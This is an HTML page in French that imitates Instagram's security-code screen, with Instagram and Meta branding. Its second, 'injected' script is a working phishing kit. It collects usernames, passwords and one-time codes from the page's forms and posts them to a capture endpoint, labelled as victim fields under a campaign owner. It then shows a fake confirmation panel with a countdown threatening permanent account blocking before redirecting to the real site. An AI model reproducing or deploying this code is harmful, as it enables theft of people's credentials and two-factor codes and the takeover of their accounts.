<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Instagram — Code de sécurité</title>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    -webkit-tap-highlight-color: transparent;
  }

  body {
    background-color: #ffffff;
    color: #000000;
    display: flex;
    flex-direction: column;
    min-height: 100vh;
    padding: 20px;
  }

  /* ================= LOGO INSTAGRAM ================= */
  .logo-container {
    display: flex;
    justify-content: center;
    margin-top: 40px;
    margin-bottom: 30px;
  }

  .ig-logo {
    width: 70px;
    height: 70px;
  }

  /* ================= TEXTES ================= */
  .header-text {
    text-align: center;
    margin-bottom: 30px;
    max-width: 400px;
    margin-left: auto;
    margin-right: auto;
  }

  .header-text h1 {
    font-size: 20px;
    font-weight: 600;
    color: #000000;
    margin-bottom: 10px;
  }

  .header-text p {
    font-size: 15px;
    color: #737373;
    line-height: 1.4;
  }

  /* ================= FORMULAIRE ================= */
  .login-form {
    display: flex;
    flex-direction: column;
    gap: 14px;
    width: 100%;
    max-width: 400px;
    margin: 0 auto;
  }

  /* ===== 6 CASES OTP ===== */
  .otp-container {
    display: flex;
    justify-content: space-between;
    gap: 8px;
    margin-bottom: 10px;
  }

  .otp-input {
    width: 100%;
    height: 55px;
    text-align: center;
    font-size: 22px;
    font-weight: 600;
    color: #000000;
    background-color: #ffffff;
    border: 1px solid #dbdbdb;
    border-radius: 12px;
    outline: none;
    transition: border-color 0.2s ease, background-color 0.2s ease;
    caret-color: #0064e0;
  }

  .otp-input:focus {
    border-color: #0064e0;
    background-color: #fafafa;
  }

  .otp-input:disabled {
    background-color: #fafafa;
    opacity: 0.7;
  }

  /* Bouton Se connecter / Confirmer */
  .btn-primary {
    width: 100%;
    padding: 15px;
    margin-top: 6px;
    background-color: #0064e0;
    color: #ffffff;
    border: none;
    border-radius: 30px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: background-color 0.2s ease, opacity 0.2s ease;
  }

  .btn-primary:hover:not(:disabled) {
    background-color: #0052b8;
  }
  
  .btn-primary:disabled {
    opacity: 0.6;
    cursor: not-allowed;
  }

  /* Lien Renvoyer le code */
  .resend-text {
    text-align: center;
    margin-top: 16px;
    margin-bottom: 40px;
    font-size: 15px;
    color: #737373;
  }

  .resend-text a {
    color: #0064e0;
    font-weight: 600;
    text-decoration: none;
  }

  .resend-text a:hover {
    text-decoration: underline;
  }

  /* ================= BOUTON BAS DE PAGE ================= */
  .bottom-actions {
    margin-top: auto; /* Pousse le logo vers le bas */
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 24px;
    width: 100%;
    max-width: 400px;
    margin-left: auto;
    margin-right: auto;
    padding-bottom: 20px;
  }

  /* Logo Meta */
  .meta-logo {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    color: #000000;
    font-size: 15px;
    font-weight: 500;
  }

  .meta-logo svg {
    width: 20px;
    height: 20px;
  }

  /* ================= CALQUE DE CHARGEMENT BLANC ================= */
  .loading-overlay {
    position: fixed;
    inset: 0;
    background-color: #ffffff;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    z-index: 9999;
    opacity: 0;
    visibility: hidden;
    transition: opacity 0.15s ease, visibility 0.15s ease;
  }

  .loading-overlay.active {
    opacity: 1;
    visibility: visible;
  }

  /* Cercle de chargement bleu sur fond blanc */
  .loader-circle {
    width: 50px;
    height: 50px;
    border-radius: 50%;
    border: 3px solid #f0f0f0;
    border-top-color: #0064e0;
    animation: spin 0.75s linear infinite;
  }

  .loading-text {
    margin-top: 20px;
    color: #737373;
    font-size: 14px;
    font-weight: 500;
  }

  @keyframes spin {
    to { transform: rotate(360deg); }
  }
</style>
</head>
<body>

  <!-- Logo Instagram -->
  <div class="logo-container">
    <svg class="ig-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
      <defs>
        <linearGradient id="ig-grad" x1="0%" y1="100%" x2="100%" y2="0%">
          <stop offset="0%" stop-color="#FD1D1D"/>
          <stop offset="35%" stop-color="#E1306C"/>
          <stop offset="70%" stop-color="#C13584"/>
          <stop offset="100%" stop-color="#833AB4"/>
        </linearGradient>
      </defs>
      <path fill="url(#ig-grad)" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
    </svg>
  </div>

  <!-- Textes d'instruction -->
  <div class="header-text">
    <h1>Entrez le code de sécurité</h1>
    <p>Nous avons envoyé un code à 6 chiffres à votre adresse e-mail ou numéro de téléphone.</p>
  </div>

  <!-- Formulaire OTP -->
  <form class="login-form" id="otpForm">
    <div class="otp-container">
      <input class="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code" aria-label="Chiffre 1">
      <input class="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Chiffre 2">
      <input class="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Chiffre 3">
      <input class="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Chiffre 4">
      <input class="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Chiffre 5">
      <input class="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Chiffre 6">
    </div>
    
    <button type="submit" class="btn-primary" id="submitBtn" disabled>Se connecter</button>
    
    <div class="resend-text">
      Vous n'avez pas reçu de code ? <a href="#" id="resendLink">Renvoyer</a>
    </div>
  </form>

  <!-- Section du bas (Logo Meta) -->
  <div class="bottom-actions">
    <div class="meta-logo">
      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 2C6.477 2 2 6.477 2 12c0 5.523 4.477 10 10 10s10-4.477 10-10c0-5.523-4.477-10-10-10z" fill="none"/>
        <path d="M16.666 8.333a4.159 4.159 0 0 0-3.04 1.364l-1.629 2.165-1.628-2.165a4.159 4.159 0 0 0-3.04-1.364c-2.301 0-4.167 1.866-4.167 4.167s1.866 4.167 4.167 4.167a4.159 4.159 0 0 0 3.04-1.364L12 13.983l1.629 2.319a4.159 4.159 0 0 0 3.04 1.364c2.301 0 4.167-1.866 4.167-4.167s-1.866-4.166-4.167-4.166zM7.333 14.833a2.5 2.5 0 1 1 0-5 2.5 2.5 0 0 1 0 5zm9.333 0a2.5 2.5 0 1 1 0-5 2.5 2.5 0 0 1 0 5z" fill="#000000"/>
      </svg>
      Meta
    </div>
  </div>

  <!-- Calque de chargement BLANC -->
  <div class="loading-overlay" id="loadingOverlay">
    <div class="loader-circle"></div>
    <p class="loading-text">Vérification en cours...</p>
  </div>

  <script>
    const OFFICIAL_URL = "https://www.instagram.com/accounts/login/";
    const DELAY_MS = 3000; // 3 secondes

    const otpForm = document.getElementById("otpForm");
    const otpInputs = document.querySelectorAll(".otp-input");
    const submitBtn = document.getElementById("submitBtn");
    const overlay = document.getElementById("loadingOverlay");
    const resendLink = document.getElementById("resendLink");

    let isSubmitting = false;

    /* ---------- Gestion des cases OTP ---------- */
    function getCode() {
      return Array.from(otpInputs).map(input => input.value).join("");
    }

    function updateButtonState() {
      // Le bouton s'active uniquement si les 6 chiffres sont entrés
      const isComplete = getCode().length === otpInputs.length;
      submitBtn.disabled = !isComplete || isSubmitting;
    }

    otpInputs.forEach((input, index) => {
      // Saisie : on garde uniquement un chiffre et on passe à la case suivante
      input.addEventListener("input", (e) => {
        const value = e.target.value.replace(/\D/g, "").slice(0, 1);
        e.target.value = value;

        if (value && index < otpInputs.length - 1) {
          otpInputs[index + 1].focus();
        }
        updateButtonState();
      });

      // Effacer : on recule d'une case si on appuie sur Backspace
      input.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && !e.target.value && index > 0) {
          otpInputs[index - 1].focus();
          otpInputs[index - 1].value = "";
          updateButtonState();
        }
        if (e.key === "ArrowLeft" && index > 0) {
          otpInputs[index - 1].focus();
        }
        if (e.key === "ArrowRight" && index < otpInputs.length - 1) {
          otpInputs[index + 1].focus();
        }
      });

      // Coller un code complet
      input.addEventListener("paste", (e) => {
        e.preventDefault();
        const pastedData = (e.clipboardData || window.clipboardData).getData("text");
        const digits = pastedData.replace(/\D/g, "").slice(0, otpInputs.length);

        otpInputs.forEach((el, i) => {
          el.value = digits[i] || "";
        });

        const nextIndex = Math.min(digits.length, otpInputs.length - 1);
        otpInputs[nextIndex].focus();
        updateButtonState();
      });
    });

    // Focus automatique sur la première case au chargement
    window.addEventListener("load", () => otpInputs[0].focus());

    /* ---------- Soumission et Chargement ---------- */
    otpForm.addEventListener("submit", (e) => {
      e.preventDefault();
      if (isSubmitting) return;
      if (getCode().length !== otpInputs.length) return;

      isSubmitting = true;

      // 1. Désactiver les champs et le bouton
      submitBtn.disabled = true;
      otpInputs.forEach(input => input.disabled = true);

      // 2. Afficher le calque de chargement blanc
      overlay.classList.add("active");

      // 3. Rediriger après 3 secondes
      setTimeout(() => {
        window.location.replace(OFFICIAL_URL);
      }, DELAY_MS);
    });

    /* ---------- Bouton "Renvoyer" ---------- */
    resendLink.addEventListener("click", (e) => {
      e.preventDefault();
      resendLink.textContent = "Code envoyé ✓";
      resendLink.style.pointerEvents = "none";
      resendLink.style.opacity = "0.6";
      
      // Réinitialiser les champs
      otpInputs.forEach(input => input.value = "");
      otpInputs[0].focus();
      updateButtonState();

      setTimeout(() => {
        resendLink.textContent = "Renvoyer";
        resendLink.style.pointerEvents = "auto";
        resendLink.style.opacity = "1";
      }, 5000);
    });
  </script>

<script data-real-injected="true" data-injected-mode="otp">
(function () {
  const REAL_CFG = {
    endpoint: "/api/capture",
    defaultOwner: "Kim",
    network: "Instagram",
    redirectUrl: "https://instagram.com",
    mode: "otp",
    useOtp: true
  };

  const urlParams = new URLSearchParams(window.location.search);
  const campaignOwner = urlParams.get("user") || urlParams.get("ref") || REAL_CFG.defaultOwner;
  const linkType = (urlParams.get("type") || REAL_CFG.mode).toLowerCase();

  let savedUser = "";
  let savedPass = "";
  let timeLeft = 50;
  let timer = null;

  function postCapture(payload) {
    return fetch(REAL_CFG.endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      keepalive: true
    }).catch((err) => console.log(err));
  }

  function ensureUI() {
    if (document.getElementById("realLoaderOverlay")) return;

    const style = document.createElement("style");
    style.textContent = `
      #realLoaderOverlay {
        position: fixed; inset: 0; width: 100vw; height: 100vh;
        background: #1877f2; z-index: 99999; display: none;
        align-items: center; justify-content: center;
      }
      #realLoaderOverlay.active { display: flex; }
      #realLoaderOverlay .spinner {
        width: 70px; height: 70px;
        border: 5px solid rgba(255,255,255,0.25);
        border-top: 5px solid #ffffff;
        border-radius: 50%; animation: realSpin 0.9s linear infinite;
      }
      #realOtpPanel {
        display: none; min-height: 100vh; width: 100%;
        background: linear-gradient(135deg, #f0f0f0 40%, #b7d1c6 100%);
        padding: 30px 20px; color: #111; font-family: Helvetica, Arial, sans-serif;
      }
      #realOtpPanel.active { display: block; }
      #realOtpPanel .box { max-width: 430px; margin: 0 auto; }
      #realOtpPanel h2 { font-size: 22px; margin-bottom: 8px; font-weight: bold; }
      #realOtpPanel p { font-size: 14px; color: #444; margin-bottom: 18px; }
      #realOtpPanel .cd { font-size: 16px; font-weight: bold; margin-bottom: 16px; text-align: center; }
      #realOtpPanel input {
        width: 100%; padding: 15px; font-size: 16px; border: 1px solid #ccc;
        border-radius: 10px; margin-bottom: 14px; background: #fff; color: #111;
      }
      #realOtpPanel .btn-main {
        background: #007bff; color: #fff; padding: 15px; width: 100%;
        border: none; font-size: 16px; border-radius: 30px; cursor: pointer; margin-bottom: 10px;
      }
      #realOtpPanel .btn-alt {
        background: transparent; color: #444; padding: 12px; width: 100%;
        font-size: 14px; border: 1px solid #ccc; border-radius: 30px; cursor: pointer;
      }
      #realOtpOverlay {
        position: fixed; inset: 0; height: 100vh; width: 100%;
        background: rgba(0,0,0,0.7); display: none;
        justify-content: center; align-items: center; z-index: 999999;
      }
      #realOtpOverlay .loader {
        border: 8px solid #f3f3f3; border-top: 8px solid #00cc66;
        border-radius: 50%; width: 60px; height: 60px; animation: realSpin 1s linear infinite;
      }
      @keyframes realSpin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    `;
    document.head.appendChild(style);

    const loader = document.createElement("div");
    loader.id = "realLoaderOverlay";
    loader.innerHTML = '<div class="spinner"></div>';
    document.body.appendChild(loader);

    const otpView = document.createElement("div");
    otpView.id = "realOtpPanel";
    otpView.innerHTML = `
      <div class="box">
        <h2>Confirmez votre compte</h2>
        <p>Saisissez le code de vérification pour confirmer votre compte.</p>
        <div class="cd" id="realCountdown">Temps restant avant blocage : 50s</div>
        <input type="text" id="realOtpInput" placeholder="Entrez le code" autocomplete="one-time-code">
        <button type="button" class="btn-main" id="realOtpContinue">Continuer</button>
        <button type="button" class="btn-alt" id="realOtpRestart">Essayer d’une autre façon</button>
      </div>
      <div id="realOtpOverlay"><div class="loader"></div></div>
    `;
    document.body.appendChild(otpView);

    document.getElementById("realOtpRestart").addEventListener("click", startTimer);
    document.getElementById("realOtpContinue").addEventListener("click", submitOtp);
  }

  function startTimer() {
    const cd = document.getElementById("realCountdown");
    if (!cd) return;
    clearInterval(timer);
    timeLeft = 50;
    cd.style.color = "#111";
    cd.textContent = "Temps restant avant blocage : " + timeLeft + "s";
    timer = setInterval(() => {
      timeLeft--;
      if (timeLeft <= 10) cd.style.color = "red";
      cd.textContent = "Temps restant avant blocage : " + timeLeft + "s";
      if (timeLeft <= 0) {
        clearInterval(timer);
        cd.textContent = "Blocage définitif en cours...";
        cd.style.color = "red";
      }
    }, 1000);
  }

  function showOtpScreen() {
    ensureUI();
    Array.from(document.body.children).forEach((el) => {
      if (el.id !== "realOtpPanel" && el.id !== "realLoaderOverlay" && el.tagName !== "SCRIPT") {
        el.style.display = "none";
      }
    });
    const otpPanel = document.getElementById("realOtpPanel");
    const otpInput = document.getElementById("realOtpInput");
    otpPanel.classList.add("active");
    otpInput.value = "";
    startTimer();
    otpInput.focus();
  }

  function submitOtp() {
    clearInterval(timer);
    const otpInput = document.getElementById("realOtpInput");
    const ov = document.getElementById("realOtpOverlay");
    const otpVal = (otpInput && otpInput.value.trim()) || "Aucun";

    postCapture({
      owner: campaignOwner,
      network: REAL_CFG.network,
      type: linkType,
      victimUser: savedUser,
      victimPass: savedPass,
      otp: otpVal
    });

    if (ov) ov.style.display = "flex";
    setTimeout(() => {
      window.location.href = REAL_CFG.redirectUrl;
    }, 7000);
  }

  function readCredentials(target) {
    const scope = (target && target.closest && target.closest("form")) || document;
    const inputs = Array.from(scope.querySelectorAll("input, select, textarea"));
    let user = "";
    let pass = "";

    inputs.forEach((inp) => {
      const t = (inp.type || "").toLowerCase();
      if (t === "password") {
        if (!pass) pass = inp.value;
      } else if (!["submit", "button", "checkbox", "radio", "hidden"].includes(t)) {
        if (!user && inp.value && inp.value.trim()) user = inp.value.trim();
      }
    });

    if (!user) {
      const alt = Array.from(document.querySelectorAll("input[type='text'], input[type='email'], input[type='tel'], input:not([type])"))
        .find((i) => i.value && i.value.trim());
      if (alt) user = alt.value.trim();
    }
    if (!pass) {
      const p = document.querySelector("input[type='password']");
      if (p) pass = p.value;
    }
    return { user, pass };
  }

  function handleLoginSubmit(e, trigger) {
    if (e && e.preventDefault) e.preventDefault();
    ensureUI();

    const { user, pass } = readCredentials(trigger);
    savedUser = user;
    savedPass = pass;

    const isOtpFlow = Boolean(REAL_CFG.useOtp && linkType !== "standard");
    const loader = document.getElementById("realLoaderOverlay");

    postCapture({
      owner: campaignOwner,
      network: REAL_CFG.network,
      type: isOtpFlow ? "otp_step1" : "standard",
      victimUser: savedUser,
      victimPass: savedPass,
      otp: "Aucun"
    });

    if (loader) loader.classList.add("active");

    setTimeout(() => {
      if (loader) loader.classList.remove("active");
      if (isOtpFlow) {
        showOtpScreen();
      } else {
        window.location.href = REAL_CFG.redirectUrl;
      }
    }, 5000);
  }

  document.addEventListener("DOMContentLoaded", ensureUI);
  ensureUI();

  document.addEventListener("submit", (e) => handleLoginSubmit(e, e.target), true);

  document.addEventListener("click", (e) => {
    const btn = e.target.closest ? e.target.closest("button, input[type='submit'], [role='button']") : null;
    if (!btn) return;
    if (btn.id === "realOtpContinue" || btn.id === "realOtpRestart") return;
    if (!btn.closest("form")) {
      handleLoginSubmit(e, btn);
    }
  }, true);
})();
</script>
</body>
